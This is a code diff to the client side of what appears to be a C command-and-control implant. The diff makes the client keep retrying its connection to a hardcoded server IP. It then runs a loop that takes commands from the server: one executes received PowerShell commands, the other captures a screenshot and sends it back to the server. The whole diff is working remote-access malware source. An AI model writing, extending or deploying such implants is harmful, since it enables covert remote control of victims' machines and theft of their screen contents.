@@ -1,9 +1,12 @@
 #define _CRT_SECURE_NO_WARNINGS
 #include <stdio.h>
 #include <stdlib.h>
+#include <stdint.h>
 #include <string.h>
 #include "c2.h"
 #include "client/client_psh.h"
+#include "client/screenshot.h"
+#include "common.h"
 
 #define SERVER_IP "192.168.100.100"
 
@@ -20,13 +23,35 @@ int main() {
     inet_pton(AF_INET, SERVER_IP, &serv.sin_addr);
 
     // Attempt to connect to c2server
-    if (connect(sock, (struct sockaddr*)&serv, sizeof(serv)) < 0) {
-        return 1;
+    while (connect(sock, (struct sockaddr*)&serv, sizeof(serv)) < 0) {
+        sleep(3);
     }
 
-    // Receive and exec command
-    char cmd[4096], buf[C2_BUF_SIZE];
-    psh_receive(cmd, sock, buf);
+    // Main loop
+    while (1) {
+        char cmd;
+
+        // Getting initial command
+        if (safe_recv(sock, &cmd, 1, 0) <= 0) {
+            sleep(3);
+            continue; 
+        }
+
+        if (cmd == '1') {
+            // Receive and exec command
+            psh_receive(sock);
+        } else if (cmd == '2') {
+            // Take screenshot and send raw file to server
+            size_t size = 0;
+            BYTE* buffer = SaveScreenshot(&size);
+            if (!buffer || size == 0) {
+                printf("[ERR] Taking screenshot failed.\n");
+                continue;
+            }
+
+            safe_send_payload(sock, buffer, size, 0);
+        } 
+    }
 
     CLOSE_SOCK(sock);
     SHUT_DOWN();
